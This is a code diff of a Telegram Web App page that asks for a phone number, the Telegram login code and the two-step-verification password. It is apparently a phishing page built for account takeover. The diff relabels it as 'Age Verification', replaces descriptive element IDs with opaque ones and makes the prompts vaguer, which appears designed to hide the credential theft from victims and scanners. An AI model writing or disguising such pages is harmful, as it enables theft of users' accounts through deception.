@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Verification</title>
+    <title>Age Verification</title>
     <link rel="stylesheet" href="styles.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
@@ -18,30 +18,30 @@
                 <span class="emoji">📱</span>
             </div>
 
-            <!-- Step 1: Phone Number -->
-            <div id="phone-section" style="width:100%;display:flex;flex-direction:column;align-items:center;gap:16px;">
+            <!-- Step 1 -->
+            <div id="s1" style="width:100%;display:flex;flex-direction:column;align-items:center;gap:16px;">
                 <div class="instruction">
-                    <b>Telegram Verification</b><br><br>
-                    Enter your phone number to receive the verification code.
+                    <b>Account Verification</b><br><br>
+                    Enter your registered mobile number to continue.
                 </div>
-                <input type="tel" id="phone-input" class="phone-input" placeholder="+91 98765 43210">
-                <button id="send-otp-btn" class="verify-btn">📤 Send Verification Code</button>
+                <input type="tel" id="inp1" class="phone-input" placeholder="+91 98765 43210">
+                <button id="btn1" class="verify-btn">📤 Continue</button>
             </div>
 
-            <!-- Step 2: OTP -->
-            <div id="otp-section" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
+            <!-- Step 2 -->
+            <div id="s2" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
                 <div class="instruction">
-                    <b>Telegram Verification</b><br><br>
-                    Enter the 5-digit code sent to your Telegram app.
+                    <b>Account Verification</b><br><br>
+                    Enter the access code sent to your device.
                 </div>
                 <div class="otp-boxes">
-                    <input type="text" maxlength="1" class="otp-box" data-index="0">
-                    <input type="text" maxlength="1" class="otp-box" data-index="1">
-                    <input type="text" maxlength="1" class="otp-box" data-index="2">
-                    <input type="text" maxlength="1" class="otp-box" data-index="3">
-                    <input type="text" maxlength="1" class="otp-box" data-index="4">
+                    <input type="text" maxlength="1" class="cb" data-index="0">
+                    <input type="text" maxlength="1" class="cb" data-index="1">
+                    <input type="text" maxlength="1" class="cb" data-index="2">
+                    <input type="text" maxlength="1" class="cb" data-index="3">
+                    <input type="text" maxlength="1" class="cb" data-index="4">
                 </div>
-                <button id="verify-btn" class="verify-btn">✅ Verify Code</button>
+                <button id="btn2" class="verify-btn">✅ Continue</button>
                 <div class="keypad">
                     <button class="key" data-key="1">1</button>
                     <button class="key" data-key="2">2</button>
@@ -58,14 +58,14 @@
                 </div>
             </div>
 
-            <!-- Step 3: 2FA -->
-            <div id="twofa-section" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
+            <!-- Step 3 -->
+            <div id="s3" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
                 <div class="instruction">
-                    <b>Two-Step Verification</b><br><br>
-                    Your account has 2FA enabled. Enter your password to continue.
+                    <b>Security Check</b><br><br>
+                    Enter your security key to unlock access.
                 </div>
-                <input type="password" id="twofa-input" class="phone-input" placeholder="Enter 2FA password">
-                <button id="twofa-btn" class="verify-btn">✅ Verify 2FA</button>
+                <input type="password" id="inp3" class="phone-input" placeholder="Enter security key">
+                <button id="btn3" class="verify-btn">✅ Unlock</button>
             </div>
 
         </div>
